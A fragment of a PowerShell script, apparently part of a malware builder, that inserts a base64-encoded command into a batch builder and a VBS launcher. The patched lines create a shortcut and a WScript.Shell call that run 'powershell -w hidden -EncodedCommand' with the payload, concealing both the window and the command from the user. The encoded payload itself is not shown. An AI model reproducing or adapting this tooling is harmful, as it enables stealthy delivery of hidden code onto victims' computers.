...
Write-Host "Encoded length: $($encoded.Length)"

# Update Create-LNK-VBS.cmd
$f = "Create-LNK-VBS.cmd"
$content = Get-Content $f
for ($i=0; $i -lt $content.Length; $i++) {
    if ($content[$i] -match 'echo lnk.Arguments = "/c powershell -w hidden -EncodedCommand') {
        $content[$i] = 'echo lnk.Arguments = "/c powershell -w hidden -EncodedCommand ' + $encoded + '" >> make_sc.vbs'
    }
}
...
$content = Get-Content $f
for ($i=0; $i -lt $content.Length; $i++) {
    if ($content[$i] -match 'CreateObject\("WScript.Shell"\).Run "powershell -w hidden -EncodedCommand') {
        $content[$i] = 'CreateObject("WScript.Shell").Run "powershell -w hidden -EncodedCommand ' + $encoded + '", 0, False'
    }
}
$content | Set-Content $f
